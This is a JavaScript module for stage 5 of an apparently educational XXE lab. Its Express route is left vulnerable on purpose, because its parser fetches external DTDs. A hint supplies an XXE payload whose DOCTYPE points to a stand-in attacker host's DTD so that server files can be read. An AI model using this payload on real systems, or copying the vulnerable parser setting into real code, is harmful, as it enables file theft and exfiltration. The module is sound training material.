'use strict';

// Stage 5 — inline external entities are off, but an external DTD is still fetched and
// its entities are processed.

const express = require('express');
const shared = require('../shared');

module.exports = {
  stage: 5,
  slug: 'external-dtd',
  title: 'External DTD fetched',
  defense: 'Ignores inline external entities but loads an external DTD.',
  hint: `Inline SYSTEM entities are ignored — but the parser still fetches the DTD named on the DOCTYPE, and that DTD can declare the malicious entity. Point it at the attacker DTD:<br><code>&lt;!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"&gt;&lt;r&gt;&amp;xxe;&lt;/r&gt;</code>`,
  lesson: 'Loading an external DTD is itself dangerous — the DTD can define entities that read files or exfiltrate data.',
  explanation:
    "The external DTD the parser fetched declared <code>xxe</code> as a SYSTEM entity, which then read the file. Never fetch external DTDs; disable DOCTYPE processing entirely.",
  status: 'vulnerable',

  createRouter(ctx) {
    const r = express.Router();
    r.get('/', (req, res) => res.send(shared.stagePage(ctx, { content: shared.xmlForm(ctx) })));
    r.post('/import', (req, res) => {
      const xml = req.body.xml || '';
      const result = shared.resolveXml(xml, { generalExternal: false, externalDtd: true });   //! ignores inline external entities but fetches an external DTD and processes its entities
      res.send(shared.stagePage(ctx, { content: shared.xmlForm(ctx, xml) + shared.resultPanel(result), success: /XXE\{/.test(result) }));
    });
    return r;
  },
};
